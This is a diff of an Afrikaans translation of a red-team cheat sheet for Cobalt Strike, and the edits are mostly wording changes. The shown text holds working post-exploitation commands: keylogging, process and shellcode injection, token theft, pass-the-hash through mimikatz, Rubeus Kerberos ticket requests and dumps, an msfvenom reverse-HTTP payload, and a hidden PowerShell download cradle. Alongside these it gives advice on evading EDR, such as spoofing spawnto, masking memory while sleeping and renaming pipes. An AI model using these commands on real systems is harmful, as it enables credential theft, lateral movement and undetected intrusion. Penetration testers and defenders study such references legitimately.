@@ -10,7 +10,7 @@
 
 ### Peer2Peer Luisteraars
 
-Die beacons van hierdie luisteraars hoef nie direk met die C2 te kommunikeer nie, hulle kan met dit kommunikeer deur ander beacons.
+Die beacons van hierdie luisteraars hoef nie direk met die C2 te kommunikeer nie, hulle kan deur ander beacons met dit kommunikeer.
 
 `Cobalt Strike -> Luisteraars -> Voeg by/Wysig` dan moet jy die TCP of SMB beacons kies.
 
@@ -21,7 +21,7 @@ Die beacons van hierdie luisteraars hoef nie direk met die C2 te kommunikeer nie
 
 #### Genereer payloads in lêers
 
-`Aanvalle -> Pakkette ->`
+`Attacks -> Packages ->`
 
 * **`HTMLApplication`** vir HTA lêers
 * **`MS Office Macro`** vir 'n kantoor dokument met 'n makro
@@ -30,11 +30,11 @@ Die beacons van hierdie luisteraars hoef nie direk met die C2 te kommunikeer nie
 
 #### Genereer & Gasheer payloads
 
-`Aanvalle -> Web Drive-by -> Scripted Web Delivery (S)` Dit sal 'n script/executable genereer om die beacon van cobalt strike af te laai in formate soos: bitsadmin, exe, powershell en python.
+`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Dit sal 'n script/executable genereer om die beacon van cobalt strike af te laai in formate soos: bitsadmin, exe, powershell en python.
 
 #### Gasheer Payloads
 
-As jy reeds die lêer het wat jy in 'n webbediener wil gasheer, gaan net na `Aanvalle -> Web Drive-by -> Gasheer Lêer` en kies die lêer om te gasheer en webbediener konfigurasie.
+As jy reeds die lêer het wat jy in 'n webbediener wil gasheer, gaan net na `Attacks -> Web Drive-by -> Gasheer Lêer` en kies die lêer om te gasheer en webbediener konfigurasie.
 
 ### Beacon Opsies
 
@@ -50,7 +50,7 @@ screenwatch    # Neem periodieke skermskote van desktop
 
 # keylogger
 keylogger [pid] [x86|x64]
-## View > Keystrokes om die getypte sleutels te sien
+## View > Keystrokes om die gedrukte sleutels te sien
 
 # portscan
 portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Spuit portscan aksie binne 'n ander proses
@@ -65,9 +65,9 @@ powerpick <cmdlet> <args> # Dit skep 'n sakrifisiale proses gespesifiseer deur s
 powerpick Invoke-PrivescAudit | fl
 psinject <pid> <arch> <commandlet> <arguments> # Dit spuit UnmanagedPowerShell in die gespesifiseerde proses om die PowerShell cmdlet uit te voer.
 
-# Gebruiker impersonasie
-## Token generasie met kredensiale
-make_token [DOMAIN\user] [password] #Skep token om 'n gebruiker in die netwerk te impersonate
+# Gebruikersverpersoonliking
+## Token generasie met krediete
+make_token [DOMAIN\user] [password] #Skep token om 'n gebruiker in die netwerk te verpersoonlik
 ls \\computer_name\c$ # Probeer om die gegenereerde token te gebruik om toegang tot C$ in 'n rekenaar te verkry
 rev2self # Stop om die token wat met make_token gegenereer is te gebruik
 ## Die gebruik van make_token genereer gebeurtenis 4624: 'n rekening is suksesvol aangemeld. Hierdie gebeurtenis is baie algemeen in 'n Windows-domein, maar kan beperk word deur op die Aanmeldtipe te filter. Soos hierbo genoem, gebruik dit LOGON32_LOGON_NEW_CREDENTIALS wat tipe 9 is.
@@ -80,45 +80,45 @@ runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.w
 ## Steel token van pid
 ## Soos make_token maar steel die token van 'n proses
 steal_token [pid] # Ook, dit is nuttig vir netwerk aksies, nie plaaslike aksies nie
-## Uit die API dokumentasie weet ons dat hierdie aanmeldtipe "die oproeper toelaat om sy huidige token te kloon". Dit is waarom die Beacon-uitset sê Impersonated <current_username> - dit impersonate ons eie gekloonde token.
+## Uit die API dokumentasie weet ons dat hierdie aanmeldtipe "die oproeper toelaat om sy huidige token te kloon". Dit is waarom die Beacon-uitset sê Verpersoonlik <current_username> - dit verpersoonlik ons eie gekloonde token.
 ls \\computer_name\c$ # Probeer om die gegenereerde token te gebruik om toegang tot C$ in 'n rekenaar te verkry
 rev2self # Stop om die token van steal_token te gebruik
 
-## Begin proses met nuwe kredensiale
+## Begin proses met nuwe krediete
 spawnas [domain\username] [password] [listener] #Doen dit vanaf 'n gids met lees toegang soos: cd C:\
-## Soos make_token, sal dit Windows gebeurtenis 4624 genereer: 'n rekening is suksesvol aangemeld maar met 'n aanmeldtipe van 2 (LOGON32_LOGON_INTERACTIVE). Dit sal die oproepende gebruiker (TargetUserName) en die geïmpersoniseerde gebruiker (TargetOutboundUserName) detail.
+## Soos make_token, sal dit Windows gebeurtenis 4624 genereer: 'n rekening is suksesvol aangemeld maar met 'n aanmeldtipe van 2 (LOGON32_LOGON_INTERACTIVE). Dit sal die oproepende gebruiker (TargetUserName) en die verpersoonlikte gebruiker (TargetOutboundUserName) detail.
 
 ## Spuit in proses
 inject [pid] [x64|x86] [listener]
 ## Vanuit 'n OpSec oogpunt: Moet nie kruis-platform inspuitings uitvoer tensy jy regtig moet nie (bv. x86 -> x64 of x64 -> x86).
 
-## Pass die hash
+## Pass the hash
 ## Hierdie wysigingsproses vereis die patching van LSASS geheue wat 'n hoë risiko aksie is, vereis plaaslike admin regte en is nie al te lewensvatbaar as Protected Process Light (PPL) geaktiveer is nie.
 pth [pid] [arch] [DOMAIN\user] [NTLM hash]
 pth [DOMAIN\user] [NTLM hash]
 
-## Pass die hash deur mimikatz
+## Pass the hash deur mimikatz
 mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
-## Sonder /run, spaw mimikatz 'n cmd.exe, as jy as 'n gebruiker met Desktop loop, sal hy die shell sien (as jy as SYSTEM loop, is jy reg om te gaan)
+## Sonder /run, spaw mimikatz 'n cmd.exe, as jy as 'n gebruiker met Desktop loop, sal hy die shell sien (as jy as SYSTEM loop, is jy goed om te gaan)
 steal_token <pid> #Steel token van proses geskep deur mimikatz
 
-## Pass die kaartjie
+## Pass the ticket
 ## Versoek 'n kaartjie
 execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
 execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
-## Skep 'n nuwe aanmeldsessie om met die nuwe kaartjie te gebruik (om nie die gecompromitteerde een te oorskryf nie)
+## Skep 'n nuwe aanmeldsessie om met die nuwe kaartjie te gebruik (om nie die gecompromitteerde een te oorskry nie)
 make_token <domain>\<username> DummyPass
 ## Skryf die kaartjie in die aanvaller masjien vanaf 'n poweshell sessie & laai dit
 [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
 kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
 
-## Pass die kaartjie van SYSTEM
+## Pass the ticket van SYSTEM
 ## Genereer 'n nuwe proses met die kaartjie
 execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
 ## Steel die token van daardie proses
 steal_token <pid>
 
-## Onthul kaartjie + Pass die kaartjie
+## Trek kaartjie + Pass the ticket
 ### Lys kaartjies
 execute-assembly C:\path\Rubeus.exe triage
 ### Dump interessante kaartjie deur luid
@@ -166,14 +166,14 @@ beacon> spawn metasploit
 # Pass sessie na Metasploit - Deur shellcode inspuiting
 ## Op metasploit gasheer
 msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
-## Voer msfvenom uit en berei die multi/handler luisteraar voor.
+## Voer msfvenom uit en berei die multi/handler luisteraar voor
 
 ## Kopieer bin lêer na cobalt strike gasheer
 ps
-shinject <pid> x64 C:\Payloads\msf.bin #Spuit metasploit shellcode in 'n x64 proses
+shinject <pid> x64 C:\Payloads\msf.bin #Inspuit metasploit shellcode in 'n x64 proses
 
 # Pass metasploit sessie na cobalt strike
-## Genereer stageless Beacon shellcode, gaan na Aanvalle > Pakkette > Windows Executable (S), kies die gewenste luisteraar, kies Raw as die Uitset tipe en kies Gebruik x64 payload.
+## Genereer stageless Beacon shellcode, gaan na Attacks > Packages > Windows Executable (S), kies die gewenste luisteraar, kies Raw as die Uitset tipe en kies Gebruik x64 payload.
 ## Gebruik post/windows/manage/shellcode_inject in metasploit om die gegenereerde cobalt strike shellcode in te spuit.
 
 # Pivoting
@@ -187,7 +187,7 @@ beacon> ssh 10.10.17.12:22 username password</code></pre>
 
 ### Execute-Assembly
 
-Die **`execute-assembly`** gebruik 'n **sakrifisiale proses** deur middel van afstand proses inspuiting om die aangeduide program uit te voer. Dit is baie luidrugtig aangesien sekere Win API's gebruik word om binne 'n proses in te spuit wat elke EDR nagaan. Daar is egter 'n paar pasgemaakte gereedskap wat gebruik kan word om iets in dieselfde proses te laai:
+Die **`execute-assembly`** gebruik 'n **sacrificial process** deur middel van afstand proses inspuiting om die aangeduide program uit te voer. Dit is baie lawaaierig aangesien sekere Win API's gebruik word om binne 'n proses in te spuit wat elke EDR nagaan. Daar is egter 'n paar pasgemaakte gereedskap wat gebruik kan word om iets in dieselfde proses te laai:
 
 - [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
 - [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
@@ -203,19 +203,19 @@ Jy kan gebeurtenisse soos `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredO
 - Sekuriteit EID 4624 - Gaan al die interaktiewe aanmeldings na om die gewone werksure te ken.
 - Stelsel EID 12,13 - Gaan die afsluit/aanvang/slaap frekwensie na.
 - Sekuriteit EID 4624/4625 - Gaan inkomende geldige/ongeldige NTLM pogings na.
-- Sekuriteit EID 4648 - Hierdie gebeurtenis word geskep wanneer platte kredensiale gebruik word om aan te meld. As 'n proses dit genereer, het die binêre moontlik die kredensiale in duidelike teks in 'n konfigurasielêer of binne die kode.
+- Sekuriteit EID 4648 - Hierdie gebeurtenis word geskep wanneer platte krediete gebruik word om aan te meld. As 'n proses dit genereer, het die binêre moontlik die krediete in duidelike teks in 'n konfigurasielêer of binne die kode.
 
 Wanneer jy `jump` van cobalt strike gebruik, is dit beter om die `wmi_msbuild` metode te gebruik om die nuwe proses meer wettig te laat lyk.
 
 ### Gebruik rekenaar rekeninge
 
-Dit is algemeen dat verdedigers vreemde gedrag wat deur gebruikers gegenereer word nagaan en **diensrekeninge en rekenaarrekeninge soos `*$` van hul monitering uitsluit**. Jy kan hierdie rekeninge gebruik om laterale beweging of privilige opgradering uit te voer.
+Dit is algemeen dat verdedigers vreemde gedrag wat deur gebruikers gegenereer word nagaan en **diensrekeninge en rekenaarrekeninge soos `*$` van hul monitering uitsluit**. Jy kan hierdie rekeninge gebruik om laterale beweging of regte verhoging uit te voer.
 
 ### Gebruik stageless payloads
 
-Stageless payloads is minder luidrugtig as staged ones omdat hulle nie 'n tweede fase van die C2 bediener hoef af te laai nie. Dit beteken dat hulle geen netwerkverkeer genereer na die aanvanklike verbinding nie, wat dit minder waarskynlik maak om deur netwerk-gebaseerde verdediging opgespoor te word.
+Stageless payloads is minder lawaaierig as staged ones omdat hulle nie 'n tweede fase van die C2 bediener hoef af te laai nie. Dit beteken dat hulle geen netwerkverkeer genereer na die aanvanklike verbinding nie, wat dit minder waarskynlik maak om deur netwerk-gebaseerde verdediging opgespoor te word.
 
-### Tokens & Token Winkel
+### Tokens & Token Stoor
 
 Wees versigtig wanneer jy tokens steel of genereer omdat dit moontlik is vir 'n EDR om al die tokens van al die threads op te som en 'n **token wat aan 'n ander gebruiker behoort** of selfs SYSTEM in die proses te vind.
 
@@ -232,13 +232,13 @@ Wanneer jy lateraal beweeg, is dit gewoonlik beter om **'n token te steel as om 
 
 ### Guardrails
 
-Cobalt Strike het 'n funksie genaamd **Guardrails** wat help om die gebruik van sekere opdragte of aksies te voorkom wat opgespoor kan word deur verdedigers. Guardrails kan geconfigureer word om spesifieke opdragte te blokkeer, soos `make_token`, `jump`, `remote-exec`, en ander wat algemeen gebruik word vir laterale beweging of privilige opgradering.
+Cobalt Strike het 'n funksie genaamd **Guardrails** wat help om die gebruik van sekere opdragte of aksies te voorkom wat deur verdedigers opgespoor kan word. Guardrails kan geconfigureer word om spesifieke opdragte te blokkeer, soos `make_token`, `jump`, `remote-exec`, en ander wat algemeen gebruik word vir laterale beweging of regte verhoging.
 
 Boonop bevat die repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) ook 'n paar kontroles en idees wat jy kan oorweeg voordat jy 'n payload uitvoer.
 
 ### Kaartjies enkripsie
 
-In 'n AD wees versigtig met die enkripsie van die kaartjies. Standaard sal sommige gereedskap RC4 enkripsie vir Kerberos kaartjies gebruik, wat minder veilig is as AES en standaard opdateerde omgewings sal AES gebruik. Dit kan opgespoor word deur verdedigers wat monitor vir swak enkripsie algoritmes.
+In 'n AD wees versigtig met die enkripsie van die kaartjies. Standaard sal sommige gereedskap RC4 enkripsie vir Kerberos kaartjies gebruik, wat minder veilig is as AES en standaard opdateer omgewings sal AES gebruik. Dit kan deur verdedigers opgespoor word wat monitor vir swak enkripsie algoritmes.
 
 ### Vermy Standaarde
 
@@ -251,28 +251,28 @@ Ook in post eksploitatie aanval kan die pype `\\.\pipe\postex_####` met `set pip
 In Cobalt Strike profiele kan jy ook dinge soos:
 
 - Vermy om `rwx` te gebruik
-- Hoe die proses inspuiting gedrag werk (watter API's sal gebruik word) in die `process-inject {...}` blok
+- Hoe die proses inspuiting gedrag werk (watter API's gebruik sal word) in die `process-inject {...}` blok
 - Hoe die "fork and run" werk in die `post-ex {…}` blok
 - Die slaap tyd
 - Die maksimum grootte van binêre om in geheue gelaai te word
 - Die geheue voetafdruk en DLL inhoud met `stage {...}` blok
-- Die netwerk verkeer
+- Die netwerkverkeer
 
 ### Bypass geheue skandering
 
 Sommige EDRs skandeer geheue vir sommige bekende malware handtekeninge. Cobalt Strike laat jou toe om die `sleep_mask` funksie as 'n BOF te wysig wat in staat sal wees om die agterdeur in geheue te enkripteer.
 
-### Luidrugtige proc inspuitings
+### Lawaaiige proc inspuitings
 
-Wanneer jy kode in 'n proses inspuit, is dit gewoonlik baie luidrugtig, dit is omdat **geen gewone proses gewoonlik hierdie aksie uitvoer nie en omdat die maniere om dit te doen baie beperk is**. Daarom kan dit opgespoor word deur gedrag-gebaseerde opsporingstelsels. Boonop kan dit ook opgespoor word deur EDRs wat die netwerk skandeer vir **threads wat kode bevat wat nie op skyf is nie** (alhoewel prosesse soos blaaiers wat JIT gebruik dit gewoonlik het). Voorbeeld: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
+Wanneer jy kode in 'n proses inspuit, is dit gewoonlik baie lawaaierig, dit is omdat **geen gewone proses gewoonlik hierdie aksie uitvoer nie en omdat die maniere om dit te doen baie beperk is**. Daarom kan dit opgespoor word deur gedrag-gebaseerde opsporingstelsels. Boonop kan dit ook opgespoor word deur EDRs wat die netwerk skandeer vir **threads wat kode bevat wat nie op skyf is nie** (alhoewel prosesse soos blaaiers wat JIT gebruik dit gewoonlik het). Voorbeeld: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
 
 ### Spawnas | PID en PPID verhoudings
 
-Wanneer jy 'n nuwe proses spaw, is dit belangrik om 'n **regte ouer-kind** verhouding tussen prosesse te handhaaf om opsporing te vermy. As svchost.exec iexplorer.exe uitvoer, sal dit verdag lyk, aangesien svchost.exe nie 'n ouer van iexplorer.exe in 'n normale Windows omgewing is nie.
+Wanneer 'n nuwe proses gespaw word, is dit belangrik om **'n gewone ouer-kind** verhouding tussen prosesse te handhaaf om opsporing te vermy. As svchost.exec iexplorer.exe uitvoer, sal dit verdag lyk, aangesien svchost.exe nie 'n ouer van iexplorer.exe in 'n normale Windows omgewing is nie.
 
-Wanneer 'n nuwe beacon in Cobalt Strike gespaw word, word standaard 'n proses wat **`rundll32.exe`** gebruik geskep om die nuwe luisteraar te laat loop. Dit is nie baie stil nie en kan maklik deur EDRs opgespoor word. Boonop, `rundll32.exe` word sonder enige args uitgevoer wat dit selfs meer verdag maak.
+Wanneer 'n nuwe beacon in Cobalt Strike gespaw word, word standaard 'n proses wat **`rundll32.exe`** gebruik geskep om die nuwe luisteraar te laat loop. Dit is nie baie stil nie en kan maklik deur EDRs opgespoor word. Boonop, `rundll32.exe` word sonder enige args uitgevoer wat dit nog meer verdag maak.
 
-Met die volgende Cobalt Strike opdrag, kan jy 'n ander proses spesifiseer om die nuwe beacon te spaw, wat dit minder opspoorbaar maak:
+Met die volgende Cobalt Strike opdrag kan jy 'n ander proses spesifiseer om die nuwe beacon te spaw, wat dit minder opspoorbaar maak:
 ```bash
 spawnto x86 svchost.exe
 ```
@@ -282,7 +282,7 @@ You can aso change this setting **`spawnto_x86` and `spawnto_x64`** in a profile
 
 Aanvallers sal soms in staat moet wees om gereedskap plaaslik te loop, selfs op linux masjiene, en die verkeer van die slagoffers na die gereedskap te laat bereik (bv. NTLM relay).
 
-Boonop, soms om 'n pass-the-hash of pass-the-ticket aanval te doen, is dit meer stealthy vir die aanvaller om **hierdie hash of kaartjie in sy eie LSASS proses** plaaslik by te voeg en dan daarvandaan te pivot in plaas van om 'n LSASS proses van 'n slagoffer masjien te verander.
+Boonop, soms om 'n pass-the-hash of pass-the-ticket aanval te doen, is dit meer stil vir die aanvaller om **hierdie hash of kaartjie in sy eie LSASS-proses** plaaslik by te voeg en dan daarvandaan te pivot in plaas daarvan om 'n LSASS-proses van 'n slagoffer masjien te verander.
 
 However, you need to be **careful with the generated traffic**, as you might be sending uncommon traffic (kerberos?) from your backdoor process. For this you could pivot to a browser process (although you could get caught injecting yourself into a process so think about a stealth way to do this).
 ```bash
@@ -292,6 +292,7 @@ However, you need to be **careful with the generated traffic**, as you might be 
 #### AV/AMSI/ETW Bypass
 
 Check the page:
+
 
 {{#ref}}
 av-bypass.md
